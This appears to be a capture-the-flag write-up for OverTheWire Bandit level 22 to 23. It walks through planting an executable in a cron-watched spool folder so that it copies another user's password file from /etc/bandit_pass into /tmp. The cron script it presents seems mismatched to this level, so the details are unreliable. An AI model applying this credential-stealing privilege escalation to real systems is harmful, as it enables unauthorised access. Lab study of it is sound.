# 🧨 Bandit Level 22 → Level 23

## 🎯 Goal

The password for the next level is stored in a **file owned by user `bandit23`**.  
But you don’t have permission to read it directly.  
Hint: There’s a cron job running scripts in `/usr/bin/cronjob_bandit23.sh`.

---

## 🖥️ Connection Details

- **Host:** `bandit.labs.overthewire.org`
- **Port:** `2220`
- **Username:** `bandit22`
- **Password:** _Use the password from Level 21_

---

## 🛠️ Steps to Solve

### 1. SSH into Bandit22

```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220

2. Check out the cron job script

cat /usr/bin/cronjob_bandit23.sh

You’ll see something like:

#!/bin/bash

for f in /var/spool/bandit23/*; do
  if [ -x "$f" ]; then
    "$f"
  fi
done

💡 This means:

    Any executable script placed in /var/spool/bandit23/

    Will be run as bandit23 (via cron)

3. Craft your script

Let’s make a script that reads the password file and writes it to a place you can access:

cd /tmp
nano my_script.sh

Paste this inside:

#!/bin/bash
cat /etc/bandit_pass/bandit23 > /tmp/bandit_pass_23

Then make it executable:

chmod +x my_script.sh

4. Move it to the watched cron folder

mv my_script.sh /var/spool/bandit23/

✅ Wait about 1 minute for the cron job to run.
5. Retrieve the password

Check the output:

cat /tmp/bandit_pass_23

🎉 That’s your password for Level 23!
📚 What I Learned

    How to exploit cron job mechanics securely

    File ownership and permission escalation via scheduled tasks

    Timing and automation in privilege separation environments

✅ Result

Password for Level 23 successfully retrieved!
